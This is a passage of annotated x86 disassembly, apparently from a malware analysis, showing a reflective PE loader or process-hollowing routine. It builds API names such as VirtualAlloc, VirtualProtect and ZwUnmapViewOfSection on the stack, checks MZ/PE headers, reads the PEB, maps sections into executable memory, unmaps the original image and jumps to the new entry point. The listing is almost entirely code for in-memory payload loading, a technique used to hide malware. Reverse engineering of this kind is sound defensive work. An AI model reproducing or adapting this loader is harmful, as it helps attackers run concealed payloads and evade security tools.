00000684 03483C                          ADD ECX,DWORD PTR [EAX+3C]
00000687 894DF0                          MOV DWORD PTR [EBP-10],ECX
0000068A 6A40                            PUSH 00000040
0000068C 6800300000                      PUSH 00003000
00000691 8B45F0                          MOV EAX,DWORD PTR [EBP-10]
00000694 8B4050                          MOV EAX,DWORD PTR [EAX+50]
00000697 40                              INC EAX
00000698 50                              PUSH EAX
00000699 6A00                            PUSH 00000000
0000069B FF55E4                          CALL DWORD PTR [EBP-1C]
0000069E 83C410                          ADD ESP,00000010
000006A1 8945FC                          MOV DWORD PTR [EBP-04],EAX
000006A4 837DFC00                        CMP DWORD PTR [EBP-04],00000000
000006A8 7507                            JNE 000006B1
000006AA 33C0                            XOR EAX,EAX
000006AC E983000000                      JMP -FFFFF8CC
000006B1 8B4510                          MOV EAX,DWORD PTR [EBP+10]
000006B4 8B4DFC                          MOV ECX,DWORD PTR [EBP-04]
000006B7 89481C                          MOV DWORD PTR [EAX+1C],ECX
000006BA 8B45F0                          MOV EAX,DWORD PTR [EBP-10]
000006BD FF7050                          PUSH DWORD PTR [EAX+50]
000006C0 FF75F8                          PUSH DWORD PTR [EBP-08]
000006C3 FF75FC                          PUSH DWORD PTR [EBP-04]
000006C6 E8F2050000                      CALL -FFFFF343
000006CB 83C40C                          ADD ESP,0000000C
000006CE FF75FC                          PUSH DWORD PTR [EBP-04]
000006D1 FF750C                          PUSH DWORD PTR [EBP+0C]
000006D4 FF7508                          PUSH DWORD PTR [EBP+08]
000006D7 E8B3FCFFFF                      CALL 0000038F
000006DC 83C40C                          ADD ESP,0000000C
000006DF 85C0                            TEST EAX,EAX
000006E1 7504                            JNE 000006E7
000006E3 33C0                            XOR EAX,EAX
000006E5 EB4D                            JMP 00000734
000006E7 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
000006EA 2B45F8                          SUB EAX,DWORD PTR [EBP-08]
000006ED 8945E0                          MOV DWORD PTR [EBP-20],EAX
000006F0 FF75E0                          PUSH DWORD PTR [EBP-20]
000006F3 FF75FC                          PUSH DWORD PTR [EBP-04]
000006F6 E8F9FAFFFF                      CALL 000001F4
000006FB 59                              POP ECX
000006FC 59                              POP ECX
000006FD 85C0                            TEST EAX,EAX
000006FF 7504                            JNE 00000705
00000701 33C0                            XOR EAX,EAX
00000703 EB2F                            JMP 00000734
00000705 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000708 8B4DFC                          MOV ECX,DWORD PTR [EBP-04]
0000070B 894818                          MOV DWORD PTR [EAX+18],ECX
0000070E 8B4514                          MOV EAX,DWORD PTR [EBP+14]
00000711 2B45F8                          SUB EAX,DWORD PTR [EBP-08]
00000714 8945F4                          MOV DWORD PTR [EBP-0C],EAX
00000717 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
0000071A 0345FC                          ADD EAX,DWORD PTR [EBP-04]
0000071D 8945F4                          MOV DWORD PTR [EBP-0C],EAX
00000720 8B4508                          MOV EAX,DWORD PTR [EBP+08]
00000723 50                              PUSH EAX
00000724 8B450C                          MOV EAX,DWORD PTR [EBP+0C]
00000727 50                              PUSH EAX
00000728 8B4518                          MOV EAX,DWORD PTR [EBP+18]
0000072B 50                              PUSH EAX
0000072C 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
0000072F FFD0                            CALL EAX
00000731 33C0                            XOR EAX,EAX
00000733 40                              INC EAX
00000734 C9                              LEAVE
00000735 C3                              RET
00000736 55                              PUSH EBP
00000737 8BEC                            MOV EBP,ESP
00000739 83EC20                          SUB ESP,00000020
0000073C C645E056                        MOV BYTE PTR [EBP-20],56    -> VirtualProtect
00000740 C645E169                        MOV BYTE PTR [EBP-1F],69
00000744 C645E272                        MOV BYTE PTR [EBP-1E],72
00000748 C645E374                        MOV BYTE PTR [EBP-1D],74
0000074C C645E475                        MOV BYTE PTR [EBP-1C],75
00000750 C645E561                        MOV BYTE PTR [EBP-1B],61
00000754 C645E66C                        MOV BYTE PTR [EBP-1A],6C
00000758 C645E750                        MOV BYTE PTR [EBP-19],50
0000075C C645E872                        MOV BYTE PTR [EBP-18],72
00000760 C645E96F                        MOV BYTE PTR [EBP-17],6F
00000764 C645EA74                        MOV BYTE PTR [EBP-16],74
00000768 C645EB65                        MOV BYTE PTR [EBP-15],65
0000076C C645EC63                        MOV BYTE PTR [EBP-14],63
00000770 C645ED74                        MOV BYTE PTR [EBP-13],74
00000774 C645EE00                        MOV BYTE PTR [EBP-12],00
00000778 8D45E0                          LEA EAX,[EBP-20]
0000077B 50                              PUSH EAX
0000077C E848070000                      CALL -FFFFF137
00000781 50                              PUSH EAX
00000782 FF5508                          CALL DWORD PTR [EBP+08]
00000785 8945FC                          MOV DWORD PTR [EBP-04],EAX
00000788 8D45F0                          LEA EAX,[EBP-10]
0000078B 50                              PUSH EAX
0000078C 6A40                            PUSH 00000040
0000078E 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000791 8B4008                          MOV EAX,DWORD PTR [EAX+08]
00000794 FF7050                          PUSH DWORD PTR [EAX+50]
00000797 8B4510                          MOV EAX,DWORD PTR [EBP+10]
0000079A FF7020                          PUSH DWORD PTR [EAX+20]
0000079D FF55FC                          CALL DWORD PTR [EBP-04]
000007A0 83C410                          ADD ESP,00000010
000007A3 85C0                            TEST EAX,EAX
000007A5 7504                            JNE 000007AB
000007A7 33C0                            XOR EAX,EAX
000007A9 EB30                            JMP 000007DB
000007AB 64A130000000                    MOV EAX,DWORD PTR FS:[00000030]
000007B1 8945F8                          MOV DWORD PTR [EBP-08],EAX
000007B4 8B45F8                          MOV EAX,DWORD PTR [EBP-08]
000007B7 8B4D10                          MOV ECX,DWORD PTR [EBP+10]
000007BA 8B4920                          MOV ECX,DWORD PTR [ECX+20]
000007BD 894808                          MOV DWORD PTR [EAX+08],ECX
000007C0 8B4510                          MOV EAX,DWORD PTR [EBP+10]
000007C3 8B4008                          MOV EAX,DWORD PTR [EAX+08]
000007C6 8B4D10                          MOV ECX,DWORD PTR [EBP+10]
000007C9 8B4920                          MOV ECX,DWORD PTR [ECX+20]
000007CC 034828                          ADD ECX,DWORD PTR [EAX+28]
000007CF 894DF4                          MOV DWORD PTR [EBP-0C],ECX
000007D2 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
000007D5 FFD0                            CALL EAX
000007D7 CC                              INT 3
000007D8 33C0                            XOR EAX,EAX
000007DA 40                              INC EAX
000007DB C9                              LEAVE
000007DC C3                              RET
000007DD 55                              PUSH EBP
000007DE 8BEC                            MOV EBP,ESP
000007E0 51                              PUSH ECX
000007E1 8B4508                          MOV EAX,DWORD PTR [EBP+08]
000007E4 8B4008                          MOV EAX,DWORD PTR [EAX+08]
000007E7 8B4D08                          MOV ECX,DWORD PTR [EBP+08]
000007EA 8B4920                          MOV ECX,DWORD PTR [ECX+20]
000007ED 3B4834                          CMP ECX,DWORD PTR [EAX+34]
000007F0 7505                            JNE 000007F7
000007F2 33C0                            XOR EAX,EAX
000007F4 40                              INC EAX
000007F5 EB39                            JMP 00000830
000007F7 8B4508                          MOV EAX,DWORD PTR [EBP+08]
000007FA 8B4008                          MOV EAX,DWORD PTR [EAX+08]
000007FD 6A08                            PUSH 00000008
000007FF 59                              POP ECX
00000800 6BC905                          IMUL ECX,ECX,00000005
00000803 837C087C00                      CMP DWORD PTR [EAX+ECX+7C],00000000
00000808 7504                            JNE 0000080E
0000080A 33C0                            XOR EAX,EAX
0000080C EB22                            JMP 00000830
0000080E 8B4508                          MOV EAX,DWORD PTR [EBP+08]
00000811 8B4008                          MOV EAX,DWORD PTR [EAX+08]
00000814 8B4D08                          MOV ECX,DWORD PTR [EBP+08]
00000817 8B4920                          MOV ECX,DWORD PTR [ECX+20]
0000081A 2B4834                          SUB ECX,DWORD PTR [EAX+34]
0000081D 894DFC                          MOV DWORD PTR [EBP-04],ECX
00000820 FF75FC                          PUSH DWORD PTR [EBP-04]
00000823 8B4508                          MOV EAX,DWORD PTR [EBP+08]
00000826 FF7020                          PUSH DWORD PTR [EAX+20]
00000829 E8C6F9FFFF                      CALL 000001F4
0000082E 59                              POP ECX
0000082F 59                              POP ECX
00000830 C9                              LEAVE
00000831 C3                              RET
00000832 55                              PUSH EBP
00000833 8BEC                            MOV EBP,ESP
00000835 81EC90000000                    SUB ESP,00000090
0000083B 83659400                        AND DWORD PTR [EBP-6C],00000000
0000083F 8365A000                        AND DWORD PTR [EBP-60],00000000
00000843 837D1000                        CMP DWORD PTR [EBP+10],00000000
00000847 7508                            JNE 00000851
00000849 8B4594                          MOV EAX,DWORD PTR [EBP-6C]
0000084C E91D030000                      JMP -FFFFF492      0xFFFFFFFF00000B6E
00000851 C645F06E                        MOV BYTE PTR [EBP-10],6E   -> ntdll.dll, VirtualQuery, VirtualAlloc, GetCurrentProcess, ZwUnmapViewOfSection
00000855 C645F174                        MOV BYTE PTR [EBP-0F],74
00000859 C645F264                        MOV BYTE PTR [EBP-0E],64
0000085D C645F36C                        MOV BYTE PTR [EBP-0D],6C
00000861 C645F46C                        MOV BYTE PTR [EBP-0C],6C
00000865 C645F52E                        MOV BYTE PTR [EBP-0B],2E
00000869 C645F664                        MOV BYTE PTR [EBP-0A],64
0000086D C645F76C                        MOV BYTE PTR [EBP-09],6C
00000871 C645F86C                        MOV BYTE PTR [EBP-08],6C
00000875 C645F900                        MOV BYTE PTR [EBP-07],00  <- Null byte
00000879 C645E056                        MOV BYTE PTR [EBP-20],56
0000087D C645E169                        MOV BYTE PTR [EBP-1F],69
00000881 C645E272                        MOV BYTE PTR [EBP-1E],72
00000885 C645E374                        MOV BYTE PTR [EBP-1D],74
00000889 C645E475                        MOV BYTE PTR [EBP-1C],75
0000088D C645E561                        MOV BYTE PTR [EBP-1B],61
00000891 C645E66C                        MOV BYTE PTR [EBP-1A],6C
00000895 C645E751                        MOV BYTE PTR [EBP-19],51
00000899 C645E875                        MOV BYTE PTR [EBP-18],75
0000089D C645E965                        MOV BYTE PTR [EBP-17],65
000008A1 C645EA72                        MOV BYTE PTR [EBP-16],72
000008A5 C645EB79                        MOV BYTE PTR [EBP-15],79
000008A9 C645EC00                        MOV BYTE PTR [EBP-14],00  <-Null byte
000008AD C645D056                        MOV BYTE PTR [EBP-30],56
000008B1 C645D169                        MOV BYTE PTR [EBP-2F],69
000008B5 C645D272                        MOV BYTE PTR [EBP-2E],72
000008B9 C645D374                        MOV BYTE PTR [EBP-2D],74
000008BD C645D475                        MOV BYTE PTR [EBP-2C],75
000008C1 C645D561                        MOV BYTE PTR [EBP-2B],61
000008C5 C645D66C                        MOV BYTE PTR [EBP-2A],6C
000008C9 C645D741                        MOV BYTE PTR [EBP-29],41
000008CD C645D86C                        MOV BYTE PTR [EBP-28],6C
000008D1 C645D96C                        MOV BYTE PTR [EBP-27],6C
000008D5 C645DA6F                        MOV BYTE PTR [EBP-26],6F
000008D9 C645DB63                        MOV BYTE PTR [EBP-25],63
000008DD C645DC00                        MOV BYTE PTR [EBP-24],00  <- Null byte
000008E1 C645BC47                        MOV BYTE PTR [EBP-44],47
000008E5 C645BD65                        MOV BYTE PTR [EBP-43],65
000008E9 C645BE74                        MOV BYTE PTR [EBP-42],74
000008ED C645BF43                        MOV BYTE PTR [EBP-41],43
000008F1 C645C075                        MOV BYTE PTR [EBP-40],75
000008F5 C645C172                        MOV BYTE PTR [EBP-3F],72
000008F9 C645C272                        MOV BYTE PTR [EBP-3E],72
000008FD C645C365                        MOV BYTE PTR [EBP-3D],65
00000901 C645C46E                        MOV BYTE PTR [EBP-3C],6E
00000905 C645C574                        MOV BYTE PTR [EBP-3B],74
00000909 C645C650                        MOV BYTE PTR [EBP-3A],50
0000090D C645C772                        MOV BYTE PTR [EBP-39],72
00000911 C645C86F                        MOV BYTE PTR [EBP-38],6F
00000915 C645C963                        MOV BYTE PTR [EBP-37],63
00000919 C645CA65                        MOV BYTE PTR [EBP-36],65
0000091D C645CB73                        MOV BYTE PTR [EBP-35],73
00000921 C645CC73                        MOV BYTE PTR [EBP-34],73
00000925 C645CD00                        MOV BYTE PTR [EBP-33],00  <- Null byte
00000929 C645A45A                        MOV BYTE PTR [EBP-5C],5A
0000092D C645A577                        MOV BYTE PTR [EBP-5B],77
00000931 C645A655                        MOV BYTE PTR [EBP-5A],55
00000935 C645A76E                        MOV BYTE PTR [EBP-59],6E
00000939 C645A86D                        MOV BYTE PTR [EBP-58],6D
0000093D C645A961                        MOV BYTE PTR [EBP-57],61
00000941 C645AA70                        MOV BYTE PTR [EBP-56],70
00000945 C645AB56                        MOV BYTE PTR [EBP-55],56
00000949 C645AC69                        MOV BYTE PTR [EBP-54],69
0000094D C645AD65                        MOV BYTE PTR [EBP-53],65
00000951 C645AE77                        MOV BYTE PTR [EBP-52],77
00000955 C645AF4F                        MOV BYTE PTR [EBP-51],4F
00000959 C645B066                        MOV BYTE PTR [EBP-50],66
0000095D C645B153                        MOV BYTE PTR [EBP-4F],53
00000961 C645B265                        MOV BYTE PTR [EBP-4E],65
00000965 C645B363                        MOV BYTE PTR [EBP-4D],63
00000969 C645B474                        MOV BYTE PTR [EBP-4C],74
0000096D C645B569                        MOV BYTE PTR [EBP-4B],69
00000971 C645B66F                        MOV BYTE PTR [EBP-4A],6F
00000975 C645B76E                        MOV BYTE PTR [EBP-49],6E
00000979 C645B800                        MOV BYTE PTR [EBP-48],00  <- Null byte
0000097D 8D45E0                          LEA EAX,[EBP-20]
00000980 50                              PUSH EAX
00000981 E843050000                      CALL -FFFFF137
00000986 50                              PUSH EAX
00000987 FF5508                          CALL DWORD PTR [EBP+08]
0000098A 894590                          MOV DWORD PTR [EBP-70],EAX
0000098D 8D45D0                          LEA EAX,[EBP-30]
00000990 50                              PUSH EAX
00000991 E833050000                      CALL -FFFFF137
00000996 50                              PUSH EAX
00000997 FF5508                          CALL DWORD PTR [EBP+08]
0000099A 89459C                          MOV DWORD PTR [EBP-64],EAX
0000099D 8D45BC                          LEA EAX,[EBP-44]
000009A0 50                              PUSH EAX
000009A1 E823050000                      CALL -FFFFF137
000009A6 50                              PUSH EAX
000009A7 FF5508                          CALL DWORD PTR [EBP+08]
000009AA 89458C                          MOV DWORD PTR [EBP-74],EAX
000009AD 8D45A4                          LEA EAX,[EBP-5C]
000009B0 50                              PUSH EAX
000009B1 8D45F0                          LEA EAX,[EBP-10]
000009B4 50                              PUSH EAX
000009B5 FF550C                          CALL DWORD PTR [EBP+0C]
000009B8 50                              PUSH EAX
000009B9 FF5508                          CALL DWORD PTR [EBP+08]
000009BC 8945A0                          MOV DWORD PTR [EBP-60],EAX
000009BF 8B4510                          MOV EAX,DWORD PTR [EBP+10]
000009C2 8B4018                          MOV EAX,DWORD PTR [EAX+18]
000009C5 8945FC                          MOV DWORD PTR [EBP-04],EAX
000009C8 6A1C                            PUSH 0000001C
000009CA 8D8570FFFFFF                    LEA EAX,[EBP-00000090]
000009D0 50                              PUSH EAX
000009D1 FF75FC                          PUSH DWORD PTR [EBP-04]
000009D4 FF5590                          CALL DWORD PTR [EBP-70]
000009D7 85C0                            TEST EAX,EAX
000009D9 7419                            JE 000009F4
000009DB 817D8000000100                  CMP DWORD PTR [EBP-80],00010000
000009E2 7502                            JNE 000009E6
000009E4 EB0E                            JMP 000009F4
000009E6 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
000009E9 03857CFFFFFF                    ADD EAX,DWORD PTR [EBP-00000084]
000009EF 8945FC                          MOV DWORD PTR [EBP-04],EAX
000009F2 EBD4                            JMP 000009C8
000009F4 8B4510                          MOV EAX,DWORD PTR [EBP+10]
000009F7 8B4008                          MOV EAX,DWORD PTR [EAX+08]
000009FA 8B4D10                          MOV ECX,DWORD PTR [EBP+10]
000009FD 8B4034                          MOV EAX,DWORD PTR [EAX+34]
00000A00 3B4118                          CMP EAX,DWORD PTR [ECX+18]
00000A03 724C                            JB 00000A51
00000A05 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000A08 8B4008                          MOV EAX,DWORD PTR [EAX+08]
00000A0B 8B4034                          MOV EAX,DWORD PTR [EAX+34]
00000A0E 3B45FC                          CMP EAX,DWORD PTR [EBP-04]
00000A11 733E                            JAE 00000A51
00000A13 837DA000                        CMP DWORD PTR [EBP-60],00000000
00000A17 7438                            JE 00000A51
00000A19 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000A1C FF7018                          PUSH DWORD PTR [EAX+18]
00000A1F FF558C                          CALL DWORD PTR [EBP-74]
00000A22 50                              PUSH EAX
00000A23 FF55A0                          CALL DWORD PTR [EBP-60]
00000A26 85C0                            TEST EAX,EAX
00000A28 7527                            JNE 00000A51
00000A2A 6A04                            PUSH 00000004
00000A2C 6800300000                      PUSH 00003000
00000A31 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000A34 8B4008                          MOV EAX,DWORD PTR [EAX+08]
00000A37 8B4050                          MOV EAX,DWORD PTR [EAX+50]
00000A3A 40                              INC EAX
00000A3B 50                              PUSH EAX
00000A3C 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000A3F 8B4008                          MOV EAX,DWORD PTR [EAX+08]
00000A42 FF7034                          PUSH DWORD PTR [EAX+34]
00000A45 FF559C                          CALL DWORD PTR [EBP-64]
00000A48 83C410                          ADD ESP,00000010
00000A4B 8B4D10                          MOV ECX,DWORD PTR [EBP+10]
00000A4E 894120                          MOV DWORD PTR [ECX+20],EAX
00000A51 6A04                            PUSH 00000004
00000A53 6800300000                      PUSH 00003000
00000A58 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000A5B 8B4008                          MOV EAX,DWORD PTR [EAX+08]
00000A5E 8B4050                          MOV EAX,DWORD PTR [EAX+50]
00000A61 40                              INC EAX
00000A62 50                              PUSH EAX
00000A63 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000A66 8B4008                          MOV EAX,DWORD PTR [EAX+08]
00000A69 FF7034                          PUSH DWORD PTR [EAX+34]
00000A6C FF559C                          CALL DWORD PTR [EBP-64]
00000A6F 83C410                          ADD ESP,00000010
00000A72 8B4D10                          MOV ECX,DWORD PTR [EBP+10]
00000A75 894120                          MOV DWORD PTR [ECX+20],EAX
00000A78 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000A7B 83782000                        CMP DWORD PTR [EAX+20],00000000
00000A7F 7544                            JNE 00000AC5
00000A81 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000A84 8B4008                          MOV EAX,DWORD PTR [EAX+08]
00000A87 6A08                            PUSH 00000008
00000A89 59                              POP ECX
00000A8A 6BC905                          IMUL ECX,ECX,00000005
00000A8D 837C087C00                      CMP DWORD PTR [EAX+ECX+7C],00000000
00000A92 7511                            JNE 00000AA5
00000A94 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000A97 8B4008                          MOV EAX,DWORD PTR [EAX+08]
00000A9A 8B4D10                          MOV ECX,DWORD PTR [EBP+10]
00000A9D 8B4034                          MOV EAX,DWORD PTR [EAX+34]
00000AA0 894120                          MOV DWORD PTR [ECX+20],EAX
00000AA3 EB20                            JMP 00000AC5
00000AA5 6A04                            PUSH 00000004
00000AA7 6800300000                      PUSH 00003000
00000AAC 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000AAF 8B4008                          MOV EAX,DWORD PTR [EAX+08]
00000AB2 8B4050                          MOV EAX,DWORD PTR [EAX+50]
00000AB5 40                              INC EAX
00000AB6 50                              PUSH EAX
00000AB7 6A00                            PUSH 00000000
00000AB9 FF559C                          CALL DWORD PTR [EBP-64]
00000ABC 83C410                          ADD ESP,00000010
00000ABF 8B4D10                          MOV ECX,DWORD PTR [EBP+10]
00000AC2 894120                          MOV DWORD PTR [ECX+20],EAX
00000AC5 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000AC8 83782000                        CMP DWORD PTR [EAX+20],00000000
00000ACC 7505                            JNE 00000AD3
00000ACE E998000000                      JMP -FFFFF495
00000AD3 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000AD6 8B4008                          MOV EAX,DWORD PTR [EAX+08]
00000AD9 FF7054                          PUSH DWORD PTR [EAX+54]
00000ADC 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000ADF FF7010                          PUSH DWORD PTR [EAX+10]
00000AE2 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000AE5 FF7020                          PUSH DWORD PTR [EAX+20]
00000AE8 E8D0010000                      CALL -FFFFF343
00000AED 83C40C                          ADD ESP,0000000C
00000AF0 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000AF3 8B4008                          MOV EAX,DWORD PTR [EAX+08]
00000AF6 8B4D10                          MOV ECX,DWORD PTR [EBP+10]
00000AF9 8B4908                          MOV ECX,DWORD PTR [ECX+08]
00000AFC 0FB74914                        MOVZX ECX,WORD PTR [ECX+14]
00000B00 8D440818                        LEA EAX,[EAX+ECX+18]
00000B04 894598                          MOV DWORD PTR [EBP-68],EAX
00000B07 8365FC00                        AND DWORD PTR [EBP-04],00000000
00000B0B EB07                            JMP 00000B14
00000B0D 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
00000B10 40                              INC EAX
00000B11 8945FC                          MOV DWORD PTR [EBP-04],EAX
00000B14 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000B17 8B4008                          MOV EAX,DWORD PTR [EAX+08]
00000B1A 0FB74006                        MOVZX EAX,WORD PTR [EAX+06]
00000B1E 3945FC                          CMP DWORD PTR [EBP-04],EAX
00000B21 7339                            JAE 00000B5C
00000B23 6B45FC28                        IMUL EAX,DWORD PTR [EBP-04],00000028
00000B27 8B4D98                          MOV ECX,DWORD PTR [EBP-68]
00000B2A FF740110                        PUSH DWORD PTR [ECX+EAX+10]
00000B2E 6B45FC28                        IMUL EAX,DWORD PTR [EBP-04],00000028
00000B32 8B4D10                          MOV ECX,DWORD PTR [EBP+10]
00000B35 8B4910                          MOV ECX,DWORD PTR [ECX+10]
00000B38 8B5598                          MOV EDX,DWORD PTR [EBP-68]
00000B3B 034C0214                        ADD ECX,DWORD PTR [EDX+EAX+14]
00000B3F 51                              PUSH ECX
00000B40 6B45FC28                        IMUL EAX,DWORD PTR [EBP-04],00000028
00000B44 8B4D10                          MOV ECX,DWORD PTR [EBP+10]
00000B47 8B4920                          MOV ECX,DWORD PTR [ECX+20]
00000B4A 8B5598                          MOV EDX,DWORD PTR [EBP-68]
00000B4D 034C020C                        ADD ECX,DWORD PTR [EDX+EAX+0C]
00000B51 51                              PUSH ECX
00000B52 E866010000                      CALL -FFFFF343
00000B57 83C40C                          ADD ESP,0000000C
00000B5A EBB1                            JMP 00000B0D
00000B5C C7459401000000                  MOV DWORD PTR [EBP-6C],00000001
00000B63 33C0                            XOR EAX,EAX
00000B65 0F8554FEFFFF                    JNE 000009BF
00000B6B 8B4594                          MOV EAX,DWORD PTR [EBP-6C]
00000B6E C9                              LEAVE
00000B6F C3                              RET
00000B70 55                              PUSH EBP
00000B71 8BEC                            MOV EBP,ESP
00000B73 51                              PUSH ECX
00000B74 8B4508                          MOV EAX,DWORD PTR [EBP+08]
00000B77 8B4D08                          MOV ECX,DWORD PTR [EBP+08]
00000B7A 8B4910                          MOV ECX,DWORD PTR [ECX+10]
00000B7D 894804                          MOV DWORD PTR [EAX+04],ECX
00000B80 8B4508                          MOV EAX,DWORD PTR [EBP+08]
00000B83 8B4004                          MOV EAX,DWORD PTR [EAX+04]
00000B86 0FB700                          MOVZX EAX,WORD PTR [EAX]
00000B89 3D4D5A0000                      CMP EAX,00005A4D
00000B8E 7404                            JE 00000B94
00000B90 33C0                            XOR EAX,EAX
00000B92 EB3F                            JMP 00000BD3
00000B94 8B4508                          MOV EAX,DWORD PTR [EBP+08]
00000B97 8B4004                          MOV EAX,DWORD PTR [EAX+04]
00000B9A 8B4D08                          MOV ECX,DWORD PTR [EBP+08]
00000B9D 8B4910                          MOV ECX,DWORD PTR [ECX+10]
00000BA0 03483C                          ADD ECX,DWORD PTR [EAX+3C]
00000BA3 8B4508                          MOV EAX,DWORD PTR [EBP+08]
00000BA6 894808                          MOV DWORD PTR [EAX+08],ECX
00000BA9 8B4508                          MOV EAX,DWORD PTR [EBP+08]
00000BAC 8B4008                          MOV EAX,DWORD PTR [EAX+08]
00000BAF 813850450000                    CMP DWORD PTR [EAX],00004550
00000BB5 7404                            JE 00000BBB
00000BB7 33C0                            XOR EAX,EAX
00000BB9 EB18                            JMP 00000BD3
00000BBB 64A130000000                    MOV EAX,DWORD PTR FS:[00000030]
00000BC1 8945FC                          MOV DWORD PTR [EBP-04],EAX
00000BC4 8B4508                          MOV EAX,DWORD PTR [EBP+08]
00000BC7 8B4DFC                          MOV ECX,DWORD PTR [EBP-04]
00000BCA 8B4908                          MOV ECX,DWORD PTR [ECX+08]
00000BCD 894818                          MOV DWORD PTR [EAX+18],ECX
00000BD0 33C0                            XOR EAX,EAX
00000BD2 40                              INC EAX
00000BD3 C9                              LEAVE
00000BD4 C3                              RET
00000BD5 55                              PUSH EBP
00000BD6 8BEC                            MOV EBP,ESP
00000BD8 FF7510                          PUSH DWORD PTR [EBP+10]
00000BDB FF750C                          PUSH DWORD PTR [EBP+0C]
00000BDE FF7508                          PUSH DWORD PTR [EBP+08]
00000BE1 E84CFCFFFF                      CALL 00000832
00000BE6 83C40C                          ADD ESP,0000000C
00000BE9 85C0                            TEST EAX,EAX
00000BEB 7504                            JNE 00000BF1
00000BED 33C0                            XOR EAX,EAX
00000BEF EB49                            JMP 00000C3A
00000BF1 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000BF4 FF7020                          PUSH DWORD PTR [EAX+20]
00000BF7 FF750C                          PUSH DWORD PTR [EBP+0C]
00000BFA FF7508                          PUSH DWORD PTR [EBP+08]
00000BFD E88DF7FFFF                      CALL 0000038F
00000C02 83C40C                          ADD ESP,0000000C
00000C05 85C0                            TEST EAX,EAX
00000C07 7504                            JNE 00000C0D
00000C09 33C0                            XOR EAX,EAX
00000C0B EB2D                            JMP 00000C3A
00000C0D FF7510                          PUSH DWORD PTR [EBP+10]
00000C10 E8C8FBFFFF                      CALL 000007DD
00000C15 59                              POP ECX
00000C16 85C0                            TEST EAX,EAX
00000C18 7504                            JNE 00000C1E
00000C1A 33C0                            XOR EAX,EAX
00000C1C EB1C                            JMP 00000C3A
00000C1E FF7510                          PUSH DWORD PTR [EBP+10]
00000C21 FF750C                          PUSH DWORD PTR [EBP+0C]
00000C24 FF7508                          PUSH DWORD PTR [EBP+08]
00000C27 E80AFBFFFF                      CALL 00000736
00000C2C 83C40C                          ADD ESP,0000000C
00000C2F 85C0                            TEST EAX,EAX
00000C31 7504                            JNE 00000C37
00000C33 33C0                            XOR EAX,EAX
00000C35 EB03                            JMP 00000C3A
00000C37 33C0                            XOR EAX,EAX
00000C39 40                              INC EAX
00000C3A 5D                              POP EBP
00000C3B C3                              RET
00000C3C 55                              PUSH EBP
00000C3D 8BEC                            MOV EBP,ESP
00000C3F FF7510                          PUSH DWORD PTR [EBP+10]
00000C42 E829FFFFFF                      CALL 00000B70
00000C47 59                              POP ECX
00000C48 85C0                            TEST EAX,EAX
00000C4A 7504                            JNE 00000C50
00000C4C 33C0                            XOR EAX,EAX
00000C4E EB43                            JMP 00000C93
00000C50 FF7510                          PUSH DWORD PTR [EBP+10]
00000C53 FF750C                          PUSH DWORD PTR [EBP+0C]
00000C56 FF7508                          PUSH DWORD PTR [EBP+08]
00000C59 E8ADF8FFFF                      CALL 0000050B
00000C5E 83C40C                          ADD ESP,0000000C
00000C61 85C0                            TEST EAX,EAX
00000C63 741D                            JE 00000C82
00000C65 FF7510                          PUSH DWORD PTR [EBP+10]
00000C68 68D51BC500                      PUSH 00C51BD5
00000C6D FF7510                          PUSH DWORD PTR [EBP+10]
00000C70 FF750C                          PUSH DWORD PTR [EBP+0C]
00000C73 FF7508                          PUSH DWORD PTR [EBP+08]
00000C76 E849F9FFFF                      CALL 000005C4
00000C7B 83C414                          ADD ESP,00000014
00000C7E EB13                            JMP 00000C93
00000C80 EB11                            JMP 00000C93
00000C82 FF7510                          PUSH DWORD PTR [EBP+10]
00000C85 FF750C                          PUSH DWORD PTR [EBP+0C]
00000C88 FF7508                          PUSH DWORD PTR [EBP+08]
00000C8B E845FFFFFF                      CALL 00000BD5
00000C90 83C40C                          ADD ESP,0000000C
00000C93 5D                              POP EBP
00000C94 C3                              RET
00000C95 55                              PUSH EBP
00000C96 8BEC                            MOV EBP,ESP
00000C98 51                              PUSH ECX
00000C99 8365FC00                        AND DWORD PTR [EBP-04],00000000
00000C9D EB07                            JMP 00000CA6
00000C9F 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
00000CA2 40                              INC EAX
00000CA3 8945FC                          MOV DWORD PTR [EBP-04],EAX
00000CA6 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
00000CA9 3B4510                          CMP EAX,DWORD PTR [EBP+10]
00000CAC 7D0D                            JGE 00000CBB
00000CAE 8B4508                          MOV EAX,DWORD PTR [EBP+08]
00000CB1 0345FC                          ADD EAX,DWORD PTR [EBP-04]
00000CB4 8A4D0C                          MOV CL,BYTE PTR [EBP+0C]
00000CB7 8808                            MOV BYTE PTR [EAX],CL
00000CB9 EBE4                            JMP 00000C9F
00000CBB C9                              LEAVE
00000CBC C3                              RET
00000CBD 55                              PUSH EBP
00000CBE 8BEC                            MOV EBP,ESP
00000CC0 51                              PUSH ECX
00000CC1 8365FC00                        AND DWORD PTR [EBP-04],00000000
00000CC5 EB07                            JMP 00000CCE
00000CC7 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
00000CCA 40                              INC EAX
00000CCB 8945FC                          MOV DWORD PTR [EBP-04],EAX
00000CCE 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
00000CD1 3B4510                          CMP EAX,DWORD PTR [EBP+10]
